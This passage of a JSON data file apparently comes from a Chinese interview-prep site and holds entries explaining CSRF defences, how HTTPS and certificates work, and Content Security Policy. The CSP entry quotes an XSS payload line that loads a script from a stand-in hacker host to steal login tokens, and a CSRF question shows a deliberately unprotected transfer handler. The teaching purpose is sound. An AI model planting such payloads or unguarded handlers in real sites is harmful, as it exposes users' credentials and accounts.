头部，如何处理？\n\n##### **3. SameSite Cookie**\n   - 什么是 SameSite Cookie 属性？有哪些取值？\n   - 如何利用 SameSite 防御 CSRF？\n   - SameSite 的限制是什么？在兼容性上是否有问题？\n\n##### **4. 双重提交 Cookie（Double Submit Cookie）**\n   - 什么是双重提交 Cookie？它的工作原理是什么？\n   - 双重提交 Cookie 与 CSRF Token 防护方法相比，有哪些优缺点？\n   - 在跨域请求场景中，双重提交 Cookie 是否有效？\n\n##### **5. 用户验证**\n   - 为什么要求用户重新输入密码或验证码可以有效防御 CSRF？\n   - 在什么场景下，应考虑使用用户验证来增强安全性？\n\n##### **6. CORS 和预检请求**\n   - CORS 在防御 CSRF 中能起到什么作用？\n   - 如果服务端启用了 CORS 配置，如何避免意外的 CSRF 风险？\n\n---\n\n### **6. 实战问题与代码分析**\n#### **问题**：\n   - 如果你发现一个系统中的表单没有验证 CSRF Token，如何修复？\n   - 给出一段代码，要求候选人分析是否存在 CSRF 漏洞，并提出解决方案：\n     ```javascript\n     app.post('/transfer', (req, res) => {\n         const { to, amount } = req.body;\n         // 假设这里执行了转账逻辑\n         res.send('Transfer complete');\n     });\n     ```\n   - 如果在一个受信任的第三方平台中加载的 iframe 中发起跨域请求，是否可能出现 CSRF？如何防御？\n\n---\n\n### **7. CSRF 与现代开发的结合**\n#### **问题**：\n   - 在前后端分离的架构中，CSRF 攻击是否更容易？为什么？\n   - 在使用 JWT 认证时，如何防御 CSRF？\n   - 如果项目需要支持多设备登录，如何设计防御 CSRF 的机制？\n\n---\n\n### **8. 项目实践经验**\n#### **问题**：\n   - 你在项目中是否遇到过 CSRF 漏洞？是如何发现并修复的？\n   - 哪种 CSRF 防御方法在你的实际项目中应用最多？为什么？\n   - 如果团队忽略了安全性，导致 CSRF 漏洞频发，你会如何推动改进？\n",
    "exerciseKeyList": "[\"a1c9963f-fb40-4d8a-aa47-e5cca8c885b7\",\"947278fd-7485-4e8c-a704-83d48280e05a\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-02T03:11:32.000Z",
    "updateAt": "2024-12-03T14:27:17.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "947278fd-7485-4e8c-a704-83d48280e05a",
        "title": "web常见的攻击方式有哪些，以及如何进行防御？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T14:06:33.000Z",
        "updateAt": "2024-08-10T17:04:36.000Z"
      },
      {
        "exerciseKey": "a1c9963f-fb40-4d8a-aa47-e5cca8c885b7",
        "title": "CSRF攻击及防护",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:33:42.000Z",
        "updateAt": "2024-07-18T23:22:04.000Z"
      }
    ]
  },
  "34": {
    "id": 34,
    "tagId": 21,
    "title": "https",
    "explanation": "阅读本文之前，咱们先来看几道面试题:\n\n-   什么是`HTTPS`？\n-   `HTTPS`改进`HTTP`存在的哪些问题？\n-   `HTTPS`加密原理是什么？\n-   什么是`对称加密`和`非对称加密`？\n-   `HTTPS`传输过程?\n-   什么是数字证书？为什么需要数字证书?\n-   为什么需要数字签名？\n\n...\n\n如果你能准确无误的回答以上问题，你可以不用继续往下面看了，如果不能，通过阅读这篇文章，我相信你肯定能完全掌握`HTTPS`。好了废话不多说，我们开始。\n\n## 什么是 HTTPS\n\n当我们在访问一个地址采用`HTTPS`协议的`Web`网站时，浏览器的地址栏内会出现一个带锁的标记，就像这样：\n\n![https1.png](https://static.ecool.fun//article/15292742-2133-4fa2-8e2c-2145cad71052.awebp)\n\n我们想要了解一个东西之前，我们得先知道它是什么，那么`HTTPS`是什么呢？\n\n可能很多同学都能说道说道：“`HTTPS`就是能够给我们的请求加密的一个东西”。的确，我们都知道，`HTTPS`可以加密，但是很多同学的理解仅限于此，无法深层次的理解`HTTPS`。那么到底什么是`HTTPS`？\n\n`HTTPS`是在`HTTP`上建立`SSL`加密层，并对传输数据进行加密，是`HTTP`协议的安全版。 说得再简单一点，`HTTPS`就是 `HTTP + SSL`:\n\n![https2.png](https://static.ecool.fun//article/dbdd40a8-4c3d-4a13-ad18-a5584645f35c.awebp)\n\n哦明白了，原来`HTTPS`就是“披着羊皮的狼”啊。`HTTP`你肯定是理解的，如果不理解，建议先去阅读`HTTP`相关知识。\n\n那`SSL`又是什么呢？\n\n![https5.png](https://static.ecool.fun//article/6fef4a22-32fe-4352-aee9-48a3211e00df.awebp)\n\n我们都知道，`HTTP`是应用层的协议，`HTTP`是直接和`TCP`通信的，当我们更换为`HTTPS`的时候，它就演变成了，先和`SSL`通信、然后再由`SSL`和`TCP`通信了。知道了这一流程，我们思考一下，加密过程是在哪个过程进行的？ 结果很显然，加密过程就是在`HTTP`\\->`SSL`这一阶段实现的，所以`SSL`简单来说，就是实现`HTTP`的加密过程:\n\n![https6.png](https://static.ecool.fun//article/62bee8eb-690e-42da-a89b-ae6359c46c5d.awebp)\n\n`对称加密`和`非对称加密`、`散列函数`这些又是啥啊？没事后面会讲，这些概念你先记住咯。\n\n## HTTPS 有什么用\n\n在讲明HTTPS的作用之前，我们先来看看`HTTP`有哪些弊端：\n\n-   和服务器通信时，直接采用明文传输，那么明文内容有可能被挟持监听和篡改\n\n由于`HTTP`本身不具备加密的功能，所以无法做到对通信内容进行加密。也就是说，我们传输的方式，都是直接以明文的形式进行传输，这些明文数据会经过中间代理服务器、路由器、wifi热点、通信服务运营商等多个物理节点，相当于所有通信的数据都在网络中`裸奔`，想想都刺激。\n\n那么显而易见，明文传输有什么缺陷呢？明文传输可能会导致`数据泄露`、`数据篡改`、`流量劫持`、`钓鱼攻击`等一系列危险。假设有这么一个场景，某一天，你的另一个女朋友过生日，于是你用浏览器登录了你的邮箱，想给她发送一封生日祝福的邮件。假如这个邮箱网站使用的是`HTTP`协议，当你点击发送的时候，你的“祝福内容”（注意：是明文），被某个黑客拦截到，然后将这份“祝福内容”直接转发到你的“现任女朋友”，那后果简直不堪设想。\n\n-   和服务器通信时，无法验证身份\n\n使用HTTP发起请求时，服务器不会验证请求方的身份，响应请求时，请求方也不会验证服务方的身份。说简单点就是，任何人都可以发起请求，同时，服务器只要接收到请求，不管对方是谁都会返回一个响应。所以任何人都可以伪造虚假服务器欺骗用户，实现“钓鱼欺诈”，用户无法察觉，这也是为啥以前我们的qq号老是被盗的原因。\n\n了解到HTTP这些缺陷之后，我们就自然知道了HTTPS到底有什么用：\n\n-   保证数据的安全性（加密我们的明文数据）\n-   保证数据的完整性\n-   身份认证\n\n## HTTPS如何加密（SSL过程）\n\n通过上面的内容，我们知道了`HTTPS`能够对数据进行加密，那么它具体是如何加密的呢？\n\n这里我们需要先了解两种加密方式：\n\n-   对称加密\n-   非对称加密\n\n> 别觉得它们会有多么难理解，心中坚信，一切计算机网络的知识都是`纸老虎`。\n\n## 什么是对称加密\n\n那么什么是`对称加密`呢？\n\n简单说就是有一个密钥，它可以加密数据，也可以对加密后的数据进行解密。试想有这样一个场景：两个港口需要运送一批货物，发货方发货时，将货物装进集装箱并用一把锁将集装箱锁起来，收货方收到货物时，需要用同样的钥匙（不一定是同一把）将集装箱打开，从而取出货物。\n\n所以简单来说，对称加密就是通信双方都有一把同样的`钥匙`，用于打开同一个`集装箱`（解密），从而获取数据的一种方式:\n\n![https3.png](https://static.ecool.fun//article/aeadcd94-048b-4767-82d9-fb693a1877ba.awebp)\n\n## HTTPS用对称加密可行吗\n\n如果通信双方（浏览器和服务器）都各自拥有同样的私钥，在发送方发送数据之前，将数据`锁`（加密）起来，然后接收方再用私钥`解锁`（解密），这样就能完美的保证通信的安全。但是关键的问题就在于，在通信之前，服务器或者浏览器如何同时拥有一把同样的私钥呢？我们来想想办法：\n\n1、服务器给浏览器传输私钥\n\n当浏览器发起请求到服务器时，服务器生成一个私钥，然后传输给浏览器，浏览器拿到之后，他们正式通信就开始用这一个私钥进行加密通信，不就行了？那么问题又来了，假设在传输私钥本身的过程中，被中间人挟持了怎么办？中间人拿到私钥之后，就可以解密通信双方的加密内容了，所以这样做肯定是不可行的。\n\n2、在浏览器里面预留服务器提供的私钥。如果我们浏览器一开始就预留了目标网站的私钥，那这样通信的时候，就只有天知地知你知我知了，这不就行了？但是问题的关键是，世界上的网站千千万，浏览器要预留全部`HTTPS`协议网站的私钥，这显然不可能啊。\n\n很显然，以上两种假设，都不能实现我们想要的加密效果，所以`对称加密`暂时被我们 `pass`.\n\n## 什么是非对称加密\n\n既然对称加密不行，那么我们就需要考虑`非对称加密`了，那`非对称加密`又是什么呢？\n\n我们还是来看看还是刚刚上面👆那个`运送货物`的例子：\n\n两个港口需要运送一批货物，发货方发货时，将货物装进集装箱并用一把锁（我们将其称为公钥）将集装箱锁起来，收货方收到货物时，需要用另外一把钥匙（我们将其称为私钥）将集装箱打开，从而取出货物。\n\n> 注意这里的关键是：当通信的一方使用公钥时，另外一方只能使用私钥，反之亦然。\n\n简单的来说就是有两把密钥，一把叫做公钥、一把叫私钥。用公钥加密的内容必须用私钥才能解开，同理，私钥加密的内容只有公钥能解开。公钥对于私钥来说是非对称的，所以我们把这种加密方式称为`非对称加密`：\n\n![https4.png](https://static.ecool.fun//article/ace66378-f196-461d-8c27-b688bdc727ec.awebp)\n\n## HTTPS用非对称加密可行吗\n\n我们利用非对称加密来模拟一下浏览器和服务器通信的过程。\n\n浏览器向服务器发起请求，服务器收到请求之后，将公钥传输给浏览器，然后在接下来的通信中，浏览器要向服务器发送数据时，先用公钥将数据加密，然后发送给服务器，服务器收到之后，再用对应的私钥进行解密，这样就保证了`浏览器->服务器`这条路的数据安全。因为浏览器发送给服务器的数据，只有服务器有私钥能够解密它。那么反过来，`服务器->浏览器`这条路的通信是否安全呢？\n\n捋一捋刚刚的过程，我们就会发现，一开始我们的服务器将公钥传输给浏览器这一步骤，显然是在明文形式下进行传输的。假设这一过程，我们的公钥被中间人挟持了，想想会发生什么情况？显然有了这个公钥，中间人就能解密由服务器利用私钥加密的数据了，虽然他不能解密浏览器端的数据，但是此时他可以伪造请求，服务器收到请求之后，利用私钥解密请求数据，之后响应请求，并用私钥对响应数据加密，接着返回给请求方，由于此时这个中间人是有对应的公钥的，所以他就能直接解密服务器返回的数据。\n\n所以很显然，利用`非对称加密` 无法保证`服务器->浏览器`这条链路的数据安全。\n\n还是像上面那样，我们来想想办法呗。\n\n我们刚刚通过分析得知，通过一组 `公钥` + `私钥` ，我们可以保证`浏览器->服务器`的安全，那我们能不能用两组 `公钥` + `私钥` 来实现两条链路的安全呢？\n\n假设现在浏览器预存了一套 `公钥` 和 `私钥`，服务器也预存了一套 `公钥` 和 `私钥`，我们来看看以下通信过程：\n\n1、浏览器向服务器发起请求，同时携带浏览器端的公钥；\n\n2、服务器端收到浏览器的公钥之后，返回服务器端的公钥给浏览器端；\n\n3、浏览器向服务器发送数据之前，利用服务器端提供的公钥对数据进行加密（保证了`浏览器->服务器`的数据安全）；\n\n4、服务器收到数据之后，利用自己的私钥进行解密，并开始响应请求，将响应数据通过浏览器端提供的公钥进行加密（保证了`服务器->浏览器`的数据安全）；\n\n5、浏览器收到数据之后，利用自己的私钥进行解密。\n\n上面这个过程，这样我们就能做到：`浏览器->服务器`、`服务器->浏览器` 两条通道都是安全的，因为他们都能提供彼此的公钥给对方使用，而且都能用自己的私钥解密对方发送的数据。貌似很完美了，对吗？\n\n但是实际上，我们不知道的是，非对称加密其实是非常耗时的，当浏览器向服务器发起请求时，用户肯定是希望越早看到响应数据越好，所以为了提高响应速度，这种两套 `公钥` + `私钥` 的方式也被pass.\n\n既然两组`公钥` + `私钥`的方式非常耗时，那我们就想办法减少非对称加密的次数不就行了？\n\n## 非对称加密 + 对称加密\n\n既然`非对称加密`比`对称加密`耗时，那我们能否将他们结合起来解决上面的问题呢？这样的话，我们就将非对称加密的次数减少为了一次。\n\n假设服务器预存了一套 `公钥（假设叫 A+ ）` 和 `私钥（假设叫 A- ）`，我们来看看如下通信过程：\n\n1、浏览器向服务器发起请求；\n\n2、服务器将自己的`公钥A+` 返回给浏览器；\n\n3、浏览器在本地生成一个密钥`B`，然后利用`公钥A+` 对密钥`B`进行加密，加密之后传输给服务器；\n\n4、服务器收到数据，利用`私钥A-`对数据进行解密，拿到浏览器生成的密钥`B`；\n\n5、之后双方的通信，都用密钥`B`进行。\n\n这种方式简直完美，实际上`HTTPS`正是利用了这种加密方式来实现加密的。仔细想想，这样是不是就万无一失了呢？\n\n下面来展示一招`偷梁换柱`:\n\n假设服务器预存了一套 `公钥（假设叫 A+ ）` 和 `私钥（假设叫 A- ）`\n\n中间人也有一套`公钥（假设叫 B+ ）` 和 `私钥（假设叫 B- ）`\n\n现在请看如下过程：\n\n1、浏览器向服务器发起请求；\n\n2、服务器响应请求，并返回`公钥A+`\n\n3、中间人挟持到`公钥A+`之后，给浏览器返回自己的`公钥B+` :\n\n![https8.png](https://static.ecool.fun//article/beff8ffa-ed9e-48be-934f-c2ecb9b5c08b.awebp)\n\n4、浏览器收到`公钥B+` 之后，生成`密钥X`，然后通过`公钥B+`对`密钥X`进行加密，之后传给服务器；\n\n5、中间人挟持到浏览器上传的数据，通过自己的`私钥B-` 对数据进行解密，得到`宓钥X`（因为`私钥X`是通过`公钥B+`加密的，所以中间人可以解密），接着，再用刚刚挟持到的`公钥 A+`对`密钥X`进行加密，最后传输给服务器 :\n\n![https9.png](https://static.ecool.fun//article/d1b6dcc2-b297-4894-a446-e9b77f967dad.awebp)\n\n> 注意：此时中间人已经拿到了服务器的`公钥A+`和浏览器的`密钥X`\n\n6、服务器收到中间人的数据，用`私钥A-`解密，得到`密钥X`\n\n接下来浏览器和服务器通信的内容，都能被中间人窃取到，因为他拿到了`密钥X`。\n\n通过这样的方式，中间人在浏览器和服务器都不知情的情况下，拿到了`密钥X`，好一招`偷梁换柱`啊！\n\n那这样看来，`非对称加密 + 对称加密` 是不是也不行了？\n\n## 数字证书\n\n上文说到，`非对称加密`+`对称加密`也是有被挟持破解的风险的，中间人通过一招`偷梁换柱`拿到了`密钥X`，且通信双方都不知道`密钥X`已经泄漏。我们先来分析一下，他之所以能拿到`密钥X`的原因是什么？我们看上面👆的第3步：\n\n```css\n3、中间人挟持到公钥A+之后，给浏览器返回自己的公钥B+；\n```\n\n看出来了吗？问题就出现在这，浏览器根本无法确认自己收到的`公钥`是否是目标网站的`公钥`，就是因为这一点，中间人返回了自己的`公钥B+`，但是浏览器傻傻的以为这就是目标服务器提供的`公钥`哇。\n\n为了解决这个问题，就用到了`数字证书`，那什么又是`数字证书`呢?\n\n在这里，我先问大家一个问题，你如何证明你就是你自己？比如张三，张三如何向别人证明自己就是张三呢？很简单嘛，用身份证不就行了嘛，对的，就是利用`身份证`。我们的国家政府会给每个合法公民颁发一个`身份证`，有了这个身份证，我们在办事的时候就能用它来证明自己的身份，国家说你是张三，其他人还敢怀疑吗？\n\n那有趣的事情就来了，我们能不能给一个网站颁发一个`身份证`呢？\n\n答案当然是肯定的了，说到这里，相信你已经明白了：`数字证书`其实就是网站的`身份证`哇!\n\n那谁来给网站颁发`身份证`呢？\n\n世界上有一个神秘的组织：**CA机构** 。就是它会给网站颁发`身份证`。当某个网站想要启用`HTTPS`协议的时候，需要向`CA机构`申请一份`证书`，这个`证书`就是`数字证书`。\n\n`数字证书`包括了证书持有者信息、公钥和有效期等等信息。\n\n有了这个证书之后，当浏览器向目标网站服务器发起请求时，服务器只需要把`数字证书`返回给浏览器就行了。因为是目标网站有`数字证书`，如同身份证一样，那浏览器就可以认为，返回数据给我的，就是这个网站。\n\n你是不是以为这样就完了？\n\n这里又产生了一个问题，在证书本身传输的过程中，万一被中间人挟持并修改了咋办？\n\n是不是有一种套娃的感觉，哈哈，没事儿，现在我们离目标越来越近了，解决了这个问题，咱们就大获全胜了。\n\n## 数字签名\n\n我们再来看看上面那个问题：在证书本身传输的过程中，万一被中间人挟持并修改了咋办？咱们换个思路。 他想改就让他改呗，咱们只要在浏览器端再校验一下证书的可靠性，不就行了吗？\n\n于是乎，`数字签名`登场了。说到签名，大家肯定都知道，签名嘛，在日常生活中，就是用一支笔，在一张纸上面进行签名。其实咱们的数字签名也是一样的。简单来说，我们可以理解为就是：CA机构在给网站颁发证书之前，在这份证书上面`签个名`。接下来我们来看看到底是如何签名的：\n\n假设CA机构有一套非对称加密的 `公钥A+` 和 `私钥A-`\n\n1、网站向CA机构申请颁发数字证书；\n\n2、CA机构通过审核之后，会生成一份证书数据（此时为明文，内容包括：证书持有者信息、网站公钥、和有效期等）；\n\n3、利用散列函数对证书的明文数据进行`Hash`处理，生成一份`数据摘要`；\n\n4、接着利用`私钥A-`对这份`数据摘要`进行加密，得到`数字签名`；\n\n5、将`证书明文数据` + `数字签名` 合并到一起，组成完整的`数字证书`;\n\n5、将这份`数字证书`颁发给对应的网站。\n\n![https10.png](https://static.ecool.fun//article/e0352f40-5f6a-46e4-a296-0a05dbcfd1c5.awebp)\n\n通过上面的步骤我们可以知道，其实`数字签名`就是**CA机构利用自有的一套非对称的私钥对证书数据进行加密之后的数据**。\n\n> 这里需要注意的是，通常我们使用公钥加密，用私钥解密。而在数字签名中，我们使用私钥加密（相当于生成签名），公钥解密（相当于验证签名）。\n\n不知你有没有发现，上面的第3个步骤:\n\n```auto\n3、利用散列函数对证书的明文数据进行Hash处理，生成一份数据摘要；\n```\n\n其实不是必须的，因为实际上，我们只需要对证书的明文数据进行签名就可以了，为什么这里我们还需要对明文数据先进行`Hash`处理呢？\n\n这是因为，一般来说，一份证书的内容比较冗长，加之非对称加密也非常耗时，所以直接对原文签名，很耗时。其实CA机构签名的时候花的时间长也就罢了，但是在浏览器验证的时候，那就很痛苦了。这时候，我们就可以用散列函数对原数据进行`Hash`，得到短一些的`数据摘要`，然后再对`数据摘要`进行签名就可以了。\n\n那么现在我们有了`数字签名`加持的`数字证书`，浏览器在接收到的时候，如何进行验证呢？\n\n> 需要注意的是，我们的浏览器已经预存了CA机构的`公钥`，这把公钥的作用就是用来解锁`数字签名`的。\n\n1、浏览器向目前网站服务器发起请求；\n\n2、目标服务器把`数字证书`返回给浏览器（包括证书明文数据 + 数字签名）；\n\n3、浏览器拿到`数字证书`之后，先拿到`签名`，利用浏览器预存的CA机构的公钥，对`签名`进行解密，解密之后得到一份`数据摘要`（假设叫`T`），接着利用证书里面提供的`Hash算法`对`明文数据`进行`Hash`，又得到一份数据摘要（假设叫`S`）。此时，如果 `T`\\=`S` ，那浏览器认为这份证书就是有效的，否则无效。\n\n![https11.png](https://static.ecool.fun//article/0dd924d3-7d5c-4133-a2e8-891045b49567.awebp)\n\n可能到这里，你一下子没转过弯来，把纸和笔拿出来，捋一捋，多看几遍，肯定能懂。\n\n也许你还有疑问，为什么有了`数字签名`，就能校验`数字证书`是否被修改过呢？ 我们来试一试吧：\n\n1、浏览器向目前网站服务器发起请求；\n\n2、目标服务器把`数字证书`返回给浏览器（包括证书明文数据 + 数字签名）；\n\n3、中间人挟持了`数字证书`，并修改了`数字证书`，接着他返回了修改之后的`数字证书`给浏览器；\n\n4、浏览器开始验证，对证书数据（这份数据是被修改过的）进行hash，得到一份数据摘要，然后用公钥解密之后也得到一份数据摘要，两份一对比，发现两份数据摘要对不上，显然是不安全的，于是停止了通信。\n\n## HTTPS完整的工作流程\n\n其实看完了上面这些内容，我相信你已经对`HTTPS`有了一个完完整整的认识，接下来，就让我们一起来总结一下，`HTTPS`完整的工作流程吧。\n\n假设现在CA机构有一套非对称加密的`公钥A+` 和 `私钥A-`（浏览器会预存`公钥A+`）\n\n目标服务器也有一套非对称加密的`公钥B+` 和 `私钥B-`\n\n1、浏览器向服务器发起请求；\n\n2、目标服务器收到请求，将`数字证书`返回给浏览器（包括`公钥B+` + 数字签名）；\n\n3、浏览器收到证书之后，先取到`签名`，利用浏览器预存的CA机构的`公钥A+`，对`签名`进行解密，解密之后得到一份`数据摘要`（假设叫`T`），接着利用证书里面提供的`Hash算法`对`明文数据`进行`Hash`，又得到一份数据摘要（假设叫`S`）。此时，如果 `T`\\=`S` ，那认为这份证书就是有效的。有效则进行下一步，否则直接断开连接；\n\n4、浏览器从证书里面取出目标网站的`公钥B+`，然后在本地生成一个密钥`X`，接着利用`公钥B+` 对密钥`X`进行加密，加密之后传输给服务器；\n\n5、服务器收到数据，利用`私钥B-`对数据进行解密，拿到浏览器生成的密钥`X`；\n\n6、之后双方的通信，都用密钥`X`加密之后进行。\n\n现在，你也能完整的说出这个过程吗？\n\n## 为什么不是所有的网站都用HTTPS\n\n既然HTTPS这么安全，为什么还是有很多网站没有启用https呢？\n\n-   买证书要钱哇😄\n\n数字证书是CA机构颁发的，但是天下没有免费的午餐，你想要他给你颁发证书，你就得付出一定的金钱。\n\n-   部署、运维比HTTP更复杂\n\n对于一个企业或者公司来说，能省成本，那就省成本，选用HTTPS之后，人力也会花费一定资源。\n\n-   某些地区或者地域，网络安全意识淡泊，对于加密不加密，压根儿不关心。\n",
    "testPoint": "### **1. HTTPS 的基本概念**\n#### **问题**：\n- 什么是 HTTPS？与 HTTP 有什么主要区别？\n- 为什么 HTTPS 比 HTTP 更安全？\n- HTTPS 是如何建立安全通信的？大致过程是什么？\n\n---\n\n### **2. HTTPS 的工作原理**\n#### **问题**：\n- HTTPS 如何使用对称加密和非对称加密？它们分别解决了什么问题？\n- 什么是 TLS/SSL？它在 HTTPS 中起什么作用？\n- HTTPS 的握手过程具体包括哪些步骤？\n  - 包括客户端和服务端如何协商加密算法。\n  - 为什么需要中间的证书验证过程？\n- 为什么 HTTPS 握手中使用了非对称加密，而数据传输中使用对称加密？\n\n---\n\n### **3. HTTPS 与 HTTP 的区别**\n#### **问题**：\n- HTTPS 和 HTTP 的主要区别有哪些？从以下几个角度展开：\n  - **加密**：明文 vs 加密。\n  - **数据完整性**：如何防止数据篡改？\n  - **身份验证**：如何确定服务器的合法性？\n- 使用 HTTPS 会有哪些潜在的性能影响？如何优化？\n\n---\n\n### **4. HTTPS 的安全性保障**\n#### **问题**：\n- HTTPS 如何解决以下安全问题？\n  - 数据窃听（防止明文被拦截）。\n  - 中间人攻击（MITM）。\n  - 数据篡改。\n- 什么是 CA 证书？它在 HTTPS 中的作用是什么？\n  - 什么是信任链？如何验证证书的合法性？\n  - 为什么自签名证书不能完全保证安全？\n- 如果证书被劫持或泄露，HTTPS 是否仍然安全？为什么？\n\n---\n\n### **5. HTTPS 的性能优化**\n#### **问题**：\n- HTTPS 握手中的性能瓶颈在哪里？如何优化？\n- 什么是 HTTP/2？它如何与 HTTPS 协作提高性能？\n  - 例如，多路复用、头部压缩等特性。\n- 什么是 TLS Session Resumption？如何减少重复握手带来的开销？\n- 什么是 OCSP Stapling？它在 HTTPS 性能优化中起什么作用？\n\n---\n\n### **6. HTTPS 的实际应用**\n#### **问题**：\n- 在实际项目中，如何配置 HTTPS？\n  - 使用 Nginx 或 Apache 配置 HTTPS 的步骤有哪些？\n  - 如何申请和安装 SSL/TLS 证书？\n- 如何确保 HTTPS 配置的安全性？\n  - 强制使用 HTTPS：HSTS（HTTP Strict Transport Security）是什么？\n  - 禁用过时的 TLS 版本（如 TLS 1.0、1.1）。\n- 项目中是否需要对静态资源的 CDN 访问启用 HTTPS？为什么？\n\n---\n\n### **7. HTTPS 的常见问题与解决方案**\n#### **问题**：\n- 如果客户端访问 HTTPS 页面时提示证书错误，可能是什么原因？如何排查？\n- 如果使用 HTTPS 后发现网站加载速度变慢，如何定位问题？\n- 什么是 Mixed Content（混合内容）？如何修复？\n\n---\n\n### **8. HTTPS 的发展与未来**\n#### **问题**：\n- 什么是 TLS 1.3？相比 TLS 1.2 有哪些改进？\n- 为什么 HTTPS 已经成为现代网站的标配？\n- 是否了解 QUIC 协议？它与 HTTPS 有什么关系？\n\n---\n\n### **9. 场景化考察**\n#### **问题**：\n- 如果你负责的项目中需要将 HTTP 切换为 HTTPS，如何规划迁移？\n- 如果一个第三方服务只支持 HTTP，而你的项目必须启用 HTTPS，如何安全地与该服务通信？\n- 假如你的项目在高流量情况下，HTTPS 握手占用了过多资源，如何优化？\n",
    "exerciseKeyList": "[\"025f89d2-e3b9-4693-ba07-da3b11036d42\",\"88f3b671-5906-4aa8-9f68-8df711d582f3\",\"47b47141-d45d-457b-8eb9-18bcb6f47e98\",\"76826682-df0e-4dad-a50f-d500a09065cb\",\"6bea229f-8bae-4472-bedb-1260ec4aea47\",\"5acf760e-09cb-4979-8cc3-b34f20f8dcfe\",\"8740bcd2-4a52-4c22-aed1-d573eb42dfa9\",\"4ce73150-a0ff-495a-a669-191b7bd7c830\",\"748b2bec-7e35-4d5b-81e1-c6fb29f00464\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T03:17:54.000Z",
    "updateAt": "2024-12-03T14:31:28.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "025f89d2-e3b9-4693-ba07-da3b11036d42",
        "title": "HTTPS 中的 SSL/TLS 是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:31:04.000Z"
      },
      {
        "exerciseKey": "47b47141-d45d-457b-8eb9-18bcb6f47e98",
        "title": "https 的证书验证过程是什么样的",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:52:09.000Z"
      },
      {
        "exerciseKey": "4ce73150-a0ff-495a-a669-191b7bd7c830",
        "title": "HTTP和HTTPS的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:45:43.000Z",
        "updateAt": "2024-07-19T18:16:19.000Z"
      },
      {
        "exerciseKey": "5acf760e-09cb-4979-8cc3-b34f20f8dcfe",
        "title": "说说 https 的握手过程",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-10T07:27:05.000Z",
        "updateAt": "2024-08-10T17:06:31.000Z"
      },
      {
        "exerciseKey": "6bea229f-8bae-4472-bedb-1260ec4aea47",
        "title": "cookie 怎么设置只在 https 时携带？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-09-06T01:26:15.000Z",
        "updateAt": "2024-08-10T17:06:58.000Z"
      },
      {
        "exerciseKey": "748b2bec-7e35-4d5b-81e1-c6fb29f00464",
        "title": "HTTPS 有哪些优点？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:58:29.000Z",
        "updateAt": "2024-08-10T17:04:57.000Z"
      },
      {
        "exerciseKey": "76826682-df0e-4dad-a50f-d500a09065cb",
        "title": "https是如何保证安全的，又是如何保证不被中间人攻击的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-24T01:26:03.000Z",
        "updateAt": "2024-08-10T17:07:22.000Z"
      },
      {
        "exerciseKey": "8740bcd2-4a52-4c22-aed1-d573eb42dfa9",
        "title": "HTTPS 为什么是安全的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T04:48:54.000Z",
        "updateAt": "2024-08-10T17:05:23.000Z"
      },
      {
        "exerciseKey": "88f3b671-5906-4aa8-9f68-8df711d582f3",
        "title": "HTTPS 加密算法和加解密过程是啥？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:31:49.000Z"
      }
    ]
  },
  "35": {
    "id": 35,
    "tagId": 21,
    "title": "Content Security Policy",
    "explanation": "跨域脚本攻击 `XSS(Cross Site Scripting)` 是最常见、危害最大的网页安全漏洞。\n\n比如网站有个留言板功能，但后台未对用户输入进行过滤，攻击者可以在留言编辑框中输入\n\n```xml\n<script src=\"http://www.hacker.org/xss.payload.js\"></script>\n```\n\n`xss.payload.js`可以获取老浏览用户的信息，如登录`token`、`用户的个人资料`等。以前的防御手段主要是对用户输入进行过滤如：去除`html`标签，实体化，关键字过滤等等，这样一来，最终的结果就是后台的大多数代码都是在做字符串验证，非常的让人不舒服。\n\n为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？\n\n所以`W3 org`引入了`CSP`，它从另外一层面给浏览器提供了保护。这就是\"网页安全政策\"（`Content Security Policy`，缩写 `CSP`）的来历。本文详细介绍如何使用 `CSP` 防止 `XSS` 攻击。\n\n## 一、简介\n\n**`CSP` 的实质就是白名单制度**，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。严格规定页面中哪些资源允许有哪些资源，不在指定范围内的统统拒绝。它的实现和执行全部由浏览器完成，开发者只需提供配置。\n\n`CSP` 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。\n\n两种方法可以启用 `CSP`。\n\n**一种是通过 `HTTP` 头信息的`Content-Security-Policy`的字段**。\n\n![](https://static.ecool.fun//article/97f21f15-b3c8-4a74-ba80-939e3cb09eec.awebp)\n\n```css\nContent-Security-Policy: script-src 'self'; object-src 'none';\nstyle-src cdn.example.org third-party.org; child-src https:\n```\n\n**另一种是通过网页的`<meta>`标签**。\n\n```css\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:\">\n\n```\n\n上面代码中，`CSP` 做了如下配置。\n\n-   脚本：只信任当前域名\n-   `<object>`标签：不信任任何`URL`，即不加载任何资源\n-   样式表：只信任`cdn.example.org`和`third-party.org`\n-   框架（`frame`）：必须使用`HTTPS`协议加载\n-   其他资源：没有限制\n\n启用后，不符合 `CSP` 的外部资源就会被阻止加载。\n\n`Chrome` 的报错信息。 ![](https://static.ecool.fun//article/a0286d98-4271-4766-8da9-a16251f3eff7.awebp)\n\n## 二、限制选项\n\n`CSP` 提供了很多限制选项，涉及安全的各个方面。\n\n### 